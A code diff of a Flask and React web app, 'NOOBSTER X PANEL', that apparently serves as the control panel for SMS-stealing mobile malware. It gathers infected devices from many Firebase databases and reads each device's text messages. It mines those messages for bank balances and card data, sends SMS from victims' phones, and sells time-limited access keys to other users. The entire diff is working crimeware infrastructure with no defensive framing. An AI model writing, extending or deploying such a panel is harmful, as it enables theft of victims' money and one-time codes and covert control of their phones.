-          newAnalyses[dev.id] = analyzeSMS(m.messages || []);
-        } catch {}
-      }));
-      setAnalyses(newAnalyses);
     } catch (e) {
+      setErr(e.message);
+    } finally {
       setLoading(false);
-      if (!silent) setErr(e.message);
     }
-  }, [apiKey, analyses]);
+  }, [apiKey]);
+
+  // Load SMS analysis for each online device
+  const loadAnalyses = useCallback(async () => {
+    const newAnalyses = {};
+    for (const dev of devices) {
+      if (analyses[dev.id]) { newAnalyses[dev.id] = analyses[dev.id]; continue; }
+      try {
+        const m = await api("/api/device/" + encodeURIComponent(dev._accountId) + "/" + encodeURIComponent(dev.id) + "/messages?key=" + encodeURIComponent(apiKey));
+        newAnalyses[dev.id] = analyzeSMS(m.messages || []);
+      } catch { newAnalyses[dev.id] = { bankBalances: [], cards: [] }; }
+    }
+    setAnalyses(newAnalyses);
+  }, [devices, analyses, apiKey]);
 
   useEffect(() => {
-    loadDevices(false);
-    const iv1 = setInterval(() => loadDevices(true), 5000);
-    const iv2 = setInterval(() => setNow(new Date()), 1000);
-    return () => { clearInterval(iv1); clearInterval(iv2); };
+    loadDevices();
+    const iv = setInterval(loadDevices, 8000);
+    return () => clearInterval(iv);
   }, [loadDevices]);
+
+  useEffect(() => {
+    if (devices.length > 0) loadAnalyses();
+  }, [devices.length]);
 
   const filtered = useMemo(() => {
     if (!search.trim()) return devices;
@@ -943,28 +812,22 @@ function PublicPanel({ apiKey, onLogout }) {
     return devices.filter(d => d.name.toLowerCase().includes(q) || d.phoneNumber.includes(q) || d.id.includes(q));
   }, [devices, search]);
 
-  const timeStr = now.toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: false });
-
   return e("div", { className: "min-h-screen flex flex-col", style: { background: "#080808", color: "#fff" } },
     e("header", { className: "sticky top-0 z-40 backdrop-blur-md", style: { background: "rgba(10,10,10,0.85)", borderBottom: "1px solid #1a1a1a" } },
       e("div", { className: "max-w-screen-2xl mx-auto px-4 py-3 flex items-center gap-3 flex-wrap" },
         e("div", { className: "flex items-center gap-2 flex-shrink-0" },
-          e("div", { className: "w-7 h-7 rounded-lg red-gradient flex items-center justify-center" }, e("img", { src: "https://i.ibb.co/TMbrv7yV/noobster.jpg", style: { width: "100%", height: "100%", objectFit: "cover", borderRadius: "inherit" } })),
+          e("div", { className: "w-7 h-7 rounded-lg red-gradient flex items-center justify-center", style: { overflow: "hidden" } }, e("img", { src: "https://i.ibb.co/TMbrv7yV/noobster.jpg", style: { width: "100%", height: "100%", objectFit: "cover" } })),
           e("span", { style: { color: "#6acfff", fontWeight: 800 } }, "NOOBSTER"),
           e("span", { className: "font-bold" }, " X PANEL")
         ),
         e("div", { className: "relative flex-1", style: { minWidth: "180px", maxWidth: "24rem" } },
-          e("input", { value: search, onChange: ev => setSearch(ev.target.value), placeholder: "Search…", className: "w-full pl-9 pr-4 py-2 rounded-xl text-sm", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
+          e("input", { value: search, onChange: ev => setSearch(ev.target.value), placeholder: "Search…", className: "w-full pl-9 pr-4 py-2 rounded-xl text-sm outline-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
           e("div", { className: "absolute left-3 top-1/2 -translate-y-1/2", style: { color: "#444" } }, e(Icon, { name: "search", size: 14 }))
         ),
         e("div", { className: "ml-auto flex items-center gap-2 flex-wrap" },
           e("div", { className: "flex items-center gap-2 px-3 py-1.5 rounded-full", style: { background: "rgba(2,44,34,0.4)", border: "1px solid rgba(6,78,59,0.4)" } },
             e("span", { className: "w-2 h-2 rounded-full bg-emerald-500 animate-pulse" }),
             e("span", { className: "text-xs font-semibold text-emerald-400" }, filtered.length + " online")
-          ),
-          e("div", { className: "flex items-center gap-1.5 px-3 py-1.5 rounded-full", style: { background: "#111", border: "1px solid #1e1e1e" } },
-            e(Icon, { name: "clock", size: 14, className: "text-[#555]" }),
-            e("span", { className: "text-xs font-mono font-bold", style: { color: "#888" } }, timeStr)
           ),
           e("button", { onClick: () => confirm("Logout?") && onLogout(), className: "flex items-center gap-2 px-3 py-1.5 rounded-xl text-xs", style: { background: "#111", border: "1px solid #222", color: "#666" } },
             e(Icon, { name: "logout", size: 14 }), "Logout")
@@ -980,7 +843,7 @@ function PublicPanel({ apiKey, onLogout }) {
     e("main", { className: "flex-1 max-w-screen-2xl mx-auto w-full px-3 py-4" },
       loading ? e("div", { className: "flex items-center justify-center py-12 gap-3" },
         e("div", { className: "w-6 h-6 border-2 animate-spin rounded-full", style: { borderColor: "#333", borderTopColor: "#ef4444" } }),
-        e("span", { className: "text-sm", style: { color: "#666" } }, "Loading…")
+        e("span", { className: "text-sm", style: { color: "#666" } }, "Loading devices…")
       ) : filtered.length === 0 ? e("div", { className: "flex flex-col items-center justify-center py-24 text-center" },
         e("div", { className: "w-16 h-16 rounded-2xl flex items-center justify-center mb-4", style: { background: "#111", border: "1px solid #1e1e1e" } }, e(Icon, { name: "shield", size: 48, className: "text-[#2a2a2a]" })),
         e("p", { className: "text-base font-bold", style: { color: "#444" } }, "No online devices"),
@@ -999,12 +862,12 @@ function PublicPanel({ apiKey, onLogout }) {
 // ============================================================
 function AccessDeniedScreen({ reason, keyObj }) {
   return e("div", { className: "min-h-screen flex items-center justify-center p-4" },
-    e("div", { className: "glass-card rounded-3xl p-8 max-w-md w-full text-center shadow-2xl" },
+    e("div", { className: "glass-card rounded-3xl p-8 max-w-md w-full text-center shadow-xl" },
       e("div", { className: "w-20 h-20 rounded-2xl mx-auto mb-6 flex items-center justify-center", style: { background: "rgba(220,38,38,0.15)", border: "1px solid rgba(220,38,38,0.3)" } },
         e(Icon, { name: "lock", size: 40, className: "text-red-400" })
       ),
       e("h1", { className: "text-2xl font-black text-red-400 mb-3" }, reason === "expired" ? "API Key Expired" : "Access Denied"),
-      e("p", { className: "text-sm mb-6", style: { color: "#888" } }, reason === "expired" ? "Your API key has expired." : "Please enter a valid API key in the URL."),
+      e("p", { className: "text-sm mb-6", style: { color: "#888" } }, reason === "expired" ? "Your API key has expired." : "Please enter a valid API key."),
       keyObj && reason === "expired" && e("div", { className: "p-3 rounded-xl mb-4 text-left", style: { background: "rgba(69,10,10,0.3)", border: "1px solid rgba(127,29,29,0.4)" } },
         e("p", { className: "text-[10px] uppercase tracking-widest mb-1", style: { color: "#f87171" } }, "Expired On"),
         e("p", { className: "text-sm font-bold text-white" }, new Date(keyObj.expiresAt).toLocaleDateString("en-IN"))
@@ -1038,13 +901,13 @@ function AdminLogin({ onSuccess }) {
     finally { setBusy(false); }
   };
   return e("div", { className: "min-h-screen flex items-center justify-center p-4" },
-    e("div", { className: "glass-card rounded-3xl p-8 max-w-sm w-full shadow-2xl" },
+    e("div", { className: "glass-card rounded-3xl p-8 max-w-sm w-full shadow-xl" },
       e("div", { className: "text-center mb-6" },
         e("div", { className: "w-16 h-16 rounded-2xl red-gradient inline-flex items-center justify-center mb-4" }, e(Icon, { name: "lock", size: 28 })),
         e("h1", { className: "text-2xl font-black" }, "Admin Access")
       ),
       e("form", { onSubmit: submit },
-        e("input", { type: "password", value: pass, onChange: ev => setPass(ev.target.value), placeholder: "Admin password", className: "w-full px-4 py-3 rounded-xl text-sm mb-3", style: { background: "#111", border: "1px solid #222", color: "#fff" }, autoFocus: true }),
+        e("input", { type: "password", value: pass, onChange: ev => setPass(ev.target.value), placeholder: "Admin password", className: "w-full px-4 py-3 rounded-xl text-sm mb-3 outline-none", style: { background: "#111", border: "1px solid #222", color: "#fff" }, autoFocus: true }),
         err && e("p", { className: "text-xs text-red-400 mb-3" }, err),
         e("button", { type: "submit", disabled: busy, className: "w-full py-3 rounded-xl red-gradient text-white font-bold text-sm disabled:opacity-50" }, busy ? "…" : "Login")
       )
@@ -1099,8 +962,8 @@ function AdminDashboard({ onLogout }) {
     finally { setLoading(false); }
   }, []);
 
+  useEffect(() => { refresh(); loadDevices(); }, []);
   useEffect(() => {
-    refresh(); loadDevices();
     const iv1 = setInterval(refresh, 5000);
     const iv2 = setInterval(loadDevices, 8000);
     return () => { clearInterval(iv1); clearInterval(iv2); };
@@ -1115,21 +978,21 @@ function AdminDashboard({ onLogout }) {
       await api("/api/admin/firebases/bulk", { method: "POST", body: JSON.stringify({ urls, key: bulkKey.trim() }) });
       setBulkUrls(""); setBulkKey("");
       showToast("Added!", "success");
-      refresh(); setTimeout(loadDevices, 1000);
+      refresh(); setTimeout(loadDevices, 500);
     } catch (e) { showToast("Failed: " + e.message, "error"); }
     finally { setBulkBusy(false); }
   };
 
   const removeFb = async (id) => {
     if (!confirm("Remove?")) return;
-    try { await api("/api/admin/firebases/" + id, { method: "DELETE" }); showToast("Removed", "success"); refresh(); setTimeout(loadDevices, 500); }
+    try { await api("/api/admin/firebases/" + id, { method: "DELETE" }); showToast("Removed", "success"); refresh(); setTimeout(loadDevices, 300); }
     catch { showToast("Failed", "error"); }
   };
 
   const clearAll = async () => {
     if (!confirm("⚠️ Remove ALL firebases?")) return;
     setClearing(true);
-    try { await api("/api/admin/firebases/all", { method: "DELETE" }); showToast("Cleared", "success"); refresh(); setTimeout(loadDevices, 500); }
+    try { await api("/api/admin/firebases/all", { method: "DELETE" }); showToast("Cleared", "success"); refresh(); setTimeout(loadDevices, 300); }
     catch { showToast("Failed", "error"); }
     finally { setClearing(false); }
   };
@@ -1141,7 +1004,7 @@ function AdminDashboard({ onLogout }) {
     try {
       for (const id of ids) await api("/api/admin/firebases/" + id, { method: "DELETE" });
       showToast(ids.length + " removed", "success");
-      refresh(); setTimeout(loadDevices, 500);
+      refresh(); setTimeout(loadDevices, 300);
     } catch { showToast("Failed", "error"); }
   };
 
@@ -1181,7 +1044,6 @@ function AdminDashboard({ onLogout }) {
     offline: devices.filter(d => !d.status).length,
     fbs: data.firebases.length,
     keys: data.api_keys.length,
-    activeKeys: data.api_keys.filter(k => k.active && (!k.expiresAt || k.expiresAt > Date.now())).length,
     failed: Object.keys(errors).filter(id => errors[id]).length
   };
 
@@ -1243,9 +1105,9 @@ function AdminDashboard({ onLogout }) {
         e("div", { className: "p-4 rounded-2xl mb-3", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
           e("h2", { className: "text-sm font-bold mb-3" }, "Bulk Add Firebase"),
           e("label", { className: "block text-[10px] uppercase tracking-widest mb-1.5", style: { color: "#888" } }, "URLs (one per line)"),
-          e("textarea", { value: bulkUrls, onChange: ev => setBulkUrls(ev.target.value), rows: 5, placeholder: "https://app1.firebaseio.com\nhttps://app2.firebaseio.com", className: "w-full px-3 py-2 rounded-lg text-xs font-mono mb-2", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
-          e("label", { className: "block text-[10px] uppercase tracking-widest mb-1.5", style: { color: "#888" } }, "Secret Key (for all)"),
-          e("input", { value: bulkKey, onChange: ev => setBulkKey(ev.target.value), placeholder: "Secret key", className: "w-full px-3 py-2 rounded-lg text-xs font-mono mb-3", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
+          e("textarea", { value: bulkUrls, onChange: ev => setBulkUrls(ev.target.value), rows: 5, placeholder: "https://app1.firebaseio.com\nhttps://app2.firebaseio.com", className: "w-full px-3 py-2 rounded-lg text-xs font-mono mb-2 outline-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
+          e("label", { className: "block text-[10px] uppercase tracking-widest mb-1.5", style: { color: "#888" } }, "Secret Key"),
+          e("input", { value: bulkKey, onChange: ev => setBulkKey(ev.target.value), placeholder: "Secret key", className: "w-full px-3 py-2 rounded-lg text-xs font-mono mb-3 outline-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
           e("button", { onClick: handleBulkAdd, disabled: bulkBusy, className: "w-full py-2.5 rounded-lg red-gradient text-white font-bold text-sm disabled:opacity-50" }, bulkBusy ? "Adding…" : "Add " + bulkUrls.split("\n").filter(l => l.trim().startsWith("http")).length + " URLs")
         ),
         e("div", { className: "p-4 rounded-2xl", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
@@ -1277,8 +1139,8 @@ function AdminDashboard({ onLogout }) {
         e("div", { className: "p-4 rounded-2xl mb-3", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
           e("h2", { className: "text-sm font-bold mb-3" }, "Generate API Key"),
           e("div", { className: "grid grid-cols-1 sm:grid-cols-2 gap-2 mb-2" },
-            e("input", { value: apiName, onChange: ev => setApiName(ev.target.value), placeholder: "Name", className: "px-3 py-2 rounded-lg text-sm", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
-            e("select", { value: apiExpiryMode, onChange: ev => setApiExpiryMode(ev.target.value), className: "px-3 py-2 rounded-lg text-sm", style: { background: "#111", border: "1px solid #222", color: "#fff" } },
+            e("input", { value: apiName, onChange: ev => setApiName(ev.target.value), placeholder: "Name", className: "px-3 py-2 rounded-lg text-sm outline-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
+            e("select", { value: apiExpiryMode, onChange: ev => setApiExpiryMode(ev.target.value), className: "px-3 py-2 rounded-lg text-sm outline-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } },
               e("option", { value: "1" }, "1 Day"),
               e("option", { value: "7" }, "7 Days"),
               e("option", { value: "30" }, "30 Days"),
@@ -1288,9 +1150,9 @@ function AdminDashboard({ onLogout }) {
               e("option", { value: "never" }, "Never")
             )
           ),
-          apiExpiryMode === "custom" && e("input", { type: "date", value: apiCustomDate, onChange: ev => setApiCustomDate(ev.target.value), className: "w-full px-3 py-2 rounded-lg text-sm mb-2", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
+          apiExpiryMode === "custom" && e("input", { type: "date", value: apiCustomDate, onChange: ev => setApiCustomDate(ev.target.value), className: "w-full px-3 py-2 rounded-lg text-sm mb-2 outline-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
           e("div", { className: "flex gap-2 mb-3" },
-            e("input", { value: apiKeyVal, onChange: ev => setApiKeyVal(ev.target.value), placeholder: "Key (auto if empty)", className: "flex-1 px-3 py-2 rounded-lg text-sm font-mono", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
+            e("input", { value: apiKeyVal, onChange: ev => setApiKeyVal(ev.target.value), placeholder: "Key (auto if empty)", className: "flex-1 px-3 py-2 rounded-lg text-sm font-mono outline-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
             e("button", { onClick: () => setApiKeyVal(genKey()), className: "px-3 rounded-lg text-xs font-semibold", style: { background: "#1a1a1a", border: "1px solid #2a2a2a", color: "#888" } }, "🎲")
           ),
           e("button", { onClick: createApiKey, className: "w-full py-2.5 rounded-lg red-gradient text-white font-bold text-sm" }, "Create API Key")
@@ -1338,7 +1200,7 @@ function AdminDashboard({ onLogout }) {
         ),
         e("div", { className: "p-4 rounded-2xl", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
           e("h3", { className: "text-sm font-bold mb-3" }, "Broadcast"),
-          e("textarea", { value: broadcast, onChange: ev => setBroadcast(ev.target.value), rows: 3, placeholder: "Message…", className: "w-full px-3 py-2 rounded-lg text-sm mb-2 resize-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
+          e("textarea", { value: broadcast, onChange: ev => setBroadcast(ev.target.value), rows: 3, placeholder: "Message…", className: "w-full px-3 py-2 rounded-lg text-sm mb-2 resize-none outline-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
           e("div", { className: "flex gap-2" },
             e("button", { onClick: () => saveStatus({ broadcast }), className: "flex-1 py-2 rounded-lg red-gradient text-white font-semibold text-sm" }, "Send"),
             e("button", { onClick: () => { setBroadcast(""); saveStatus({ broadcast: "" }); }, className: "px-3 py-2 rounded-lg text-xs", style: { background: "#1a1a1a", border: "1px solid #2a2a2a", color: "#888" } }, "Clear")
@@ -1358,7 +1220,7 @@ function AdminDashboard({ onLogout }) {
 }
 
 // ============================================================
-// PUBLIC PANEL WRAPPER
+// PUBLIC WRAPPER
 // ============================================================
 function PublicPanelWrapper({ apiKey }) {
   const [status, setStatus] = useState({ valid: null, reason: null, keyObj: null });
@@ -1402,9 +1264,7 @@ function App() {
   }
 
   const m = path.match(/^\/v2\/(.+)$/);
-  if (m) {
-    return e(PublicPanelWrapper, { apiKey: m[1] });
-  }
+  if (m) return e(PublicPanelWrapper, { apiKey: m[1] });
 
   return e("div", { className: "min-h-screen flex items-center justify-center p-4" },
     e("div", { className: "glass-card rounded-3xl p-8 max-w-md w-full text-center" },
@@ -1420,14 +1280,13 @@ ReactDOM.createRoot(document.getElementById("root")).render(e(App));
 </body>
 </html>"""
 
-# Replace placeholders
 PAGE_HTML = PAGE_HTML.replace("__CONTACT_USERNAME__", CONTACT_USERNAME)
 PAGE_HTML = PAGE_HTML.replace("__TELEGRAM_CHANNEL__", TELEGRAM_CHANNEL)
 
+# ============================================================
+# API ROUTES (NO CACHE - SIMPLE & WORKS)
+# ============================================================
 
-# ============================================================
-# API ROUTES
-# ============================================================
 @app.route("/api/admin/login", methods=["POST"])
 def api_admin_login():
     data = request.get_json() or {}
@@ -1441,12 +1300,26 @@ def api_admin_data():
 
 @app.route("/api/admin/devices")
 def api_admin_devices():
-    # Use cached data — instant response
-    with CACHE["lock"]:
-        devices = list(CACHE["devices"])
-        per_account = dict(CACHE["per_account"])
-        errors = dict(CACHE["errors"])
-    return jsonify({"devices": devices, "per_account": per_account, "errors": errors})
+    # Simple: fetch all firebases directly, return everything
+    d = load_data()
+    all_devices = []
+    per_acc = {}
+    errors = {}
+    for fb in d["firebases"]:
+        try:
+            raw = fetch_firebase(fb["url"], fb["key"], "clients", timeout=5)
+            count = 0
+            if raw and isinstance(raw, dict):
+                for did, dev in raw.items():
+                    parsed = parse_device(did, dev, fb["id"], fb["name"])
+                    if parsed:
+                        all_devices.append(parsed)
+                        count += 1
+            per_acc[fb["id"]] = count
+        except ValueError as ex:
+            per_acc[fb["id"]] = 0
+            errors[fb["id"]] = str(ex)
+    return jsonify({"devices": all_devices, "per_account": per_acc, "errors": errors})
 
 @app.route("/api/validate")
 def api_validate():
@@ -1459,7 +1332,7 @@ def api_validate():
         return jsonify({"valid": False, "reason": "inactive"})
     exp = found.get("expiresAt")
     if exp and exp > 0 and time.time() * 1000 > exp:
-        return jsonify({"valid": False, "reason": "expired", "keyObj": {"expiresAt": exp, "key": key}})
+        return jsonify({"valid": False, "reason": "expired", "keyObj": {"expiresAt": exp}})
     return jsonify({"valid": True})
 
 @app.route("/api/devices")
@@ -1473,9 +1346,18 @@ def api_devices():
     if exp and exp > 0 and time.time() * 1000 > exp:
         return jsonify({"error": "Expired"}), 401
 
-    # Return cached online devices INSTANTLY
-    with CACHE["lock"]:
-        all_devices = [d for d in CACHE["devices"] if d.get("status") is True]
+    # Simple: fetch all, filter online
+    all_devices = []
+    for fb in d["firebases"]:
+        try:
+            raw = fetch_firebase(fb["url"], fb["key"], "clients", timeout=5)
+            if raw and isinstance(raw, dict):
+                for did, dev in raw.items():
+                    parsed = parse_device(did, dev, fb["id"], fb["name"])
+                    if parsed and parsed["status"] is True:
+                        all_devices.append(parsed)
+        except Exception:
+            pass
     return jsonify({"devices": all_devices, "broadcast": d["status"].get("broadcast", "")})
 
 @app.route("/api/device/<acc_id>/<device_id>/messages")
@@ -1487,12 +1369,12 @@ def api_device_messages(acc_id, device_id):
         return jsonify({"error": "Invalid key"}), 401
     fb = next((f for f in d["firebases"] if f["id"] == acc_id), None)
     if not fb:
-        return jsonify({"error": "Firebase not found"}), 404
+        return jsonify({"error": "Not found"}), 404
     try:
         raw = fetch_firebase(fb["url"], fb["key"], "messages/" + device_id, timeout=8)
         return jsonify({"messages": parse_messages(raw)})
-    except ValueError as e:
-        return jsonify({"error": str(e)}), 500
+    except ValueError as ex:
+        return jsonify({"error": str(ex)}), 500
 
 @app.route("/api/device/<acc_id>/<device_id>/send", methods=["POST"])
 def api_device_send(acc_id, device_id):
@@ -1503,7 +1385,7 @@ def api_device_send(acc_id, device_id):
         return jsonify({"error": "Invalid key"}), 401
     fb = next((f for f in d["firebases"] if f["id"] == acc_id), None)
     if not fb:
-        return jsonify({"error": "Firebase not found"}), 404
+        return jsonify({"error": "Not found"}), 404
     data = request.get_json() or {}
     try:
         firebase_put(fb["url"], fb["key"], "clients/" + device_id + "/webhookEvent/sendSms", {
@@ -1513,8 +1395,8 @@ def api_device_send(acc_id, device_id):
             "isSended": False
         })
         return jsonify({"ok": True})
-    except ValueError as e:
-        return jsonify({"error": str(e)}), 500
+    except ValueError as ex:
+        return jsonify({"error": str(ex)}), 500
 
 @app.route("/api/device/<acc_id>/<device_id>/delete", methods=["DELETE"])
 def api_device_delete(acc_id, device_id):
@@ -1525,14 +1407,13 @@ def api_device_delete(acc_id, device_id):
         return jsonify({"error": "Invalid key"}), 401
     fb = next((f for f in d["firebases"] if f["id"] == acc_id), None)
     if not fb:
-        return jsonify({"error": "Firebase not found"}), 404
+        return jsonify({"error": "Not found"}), 404
     try:
         firebase_delete(fb["url"], fb["key"], "clients/" + device_id)
         return jsonify({"ok": True})
-    except ValueError as e:
-        return jsonify({"error": str(e)}), 500
+    except ValueError as ex:
+        return jsonify({"error": str(ex)}), 500
 
-# ---------- Admin: Firebases ----------
 @app.route("/api/admin/firebases/bulk", methods=["POST"])
 def api_admin_fb_bulk():
     data = request.get_json() or {}
@@ -1576,7 +1457,6 @@ def api_admin_fb_all():
     save_data(d)
     return jsonify({"ok": True})
 
-# ---------- Admin: API keys ----------
 @app.route("/api/admin/apikeys", methods=["POST"])
 def api_admin_apikey_create():
     data = request.get_json() or {}
@@ -1643,16 +1523,8 @@ def public_panel_route(api_key):
 
 @app.route("/healthz")
 def health():
-    with CACHE["lock"]:
-        ready = CACHE["ready"]
-        last = CACHE["last_refresh"]
-        count = len(CACHE["devices"])
-    return jsonify({"status": "ok", "ready": ready, "last_refresh": last, "device_count": count})
-
-# ============================================================
-# START BACKGROUND THREAD
-# ============================================================
-start_background()
+    d = load_data()
+    return jsonify({"status": "ok", "fbs": len(d["firebases"]), "keys": len(d["api_keys"])})
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
